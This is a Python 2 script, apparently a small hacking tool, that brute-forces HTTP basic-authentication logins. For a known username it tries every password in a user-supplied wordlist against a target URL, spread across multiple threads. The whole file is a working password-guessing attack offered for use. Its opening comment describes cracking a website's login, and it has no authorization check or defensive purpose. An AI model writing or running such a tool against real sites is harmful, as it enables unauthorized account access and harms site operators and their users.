#!/usr/bin/env python
#-*- coding:utf-8 -*-
#This program can be used to brute login a website which adopt authentication with
#http basic authorization, you can use your own password files to finish crack on
#the premise of a username you know.
__author__ = '@S4kur4'

import requests
import threading
import Queue
import base64
import sys
import optparse

user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0"

def build_passwordlist(passwordlist_file):
    fd = open(passwordlist_file, "rb")
    raw_words = fd.readlines()
    fd.close()
    passwords = Queue.Queue() 
    for password in raw_words:
        password = password.strip()
        passwords.put(password)
    return passwords

def brutelogin(password_queue, username, target_url):
    while not password_queue.empty(): 
        attempt = password_queue.get()
        attempt_list = []
        attempt_list.append("%s" % attempt)
        for password in attempt_list:
            try:
            	status = requests.get(target_url, auth=(username, password))
            	print "Brute login use %s:%s => %s" % (username, password, status)
            except Exception, e:
                print "error"

def main():
	parser = optparse.OptionParser('usage: %prog [options]')
	parser.add_option('-u', '--url', dest='target_url', type='string', help='specify target URL')
	parser.add_option('-n', '--name', dest='username', type='string', help='specify target username')
	parser.add_option('-f', '--file', dest='wordlist_file', type='string', help='specify passwords dictionary file')
	parser.add_option('-t', '--threads', dest='threads', default=20, type='int', help='specify threads number')
	(options, args) = parser.parse_args()
	if (options.target_url==None) | (options.username==None) | (options.wordlist_file==None):
		parser.print_help()
		sys.exit(0)
	else:
		target_url = options.target_url
		username = options.username
		passwordlist_file= options.wordlist_file
		threads = options.threads
	password_queue = build_passwordlist(passwordlist_file)
	for i in range(options.threads):
		t = threading.Thread(target = brutelogin, args = (password_queue, username, target_url))
		t.start()

if __name__ == '__main__':
	main()
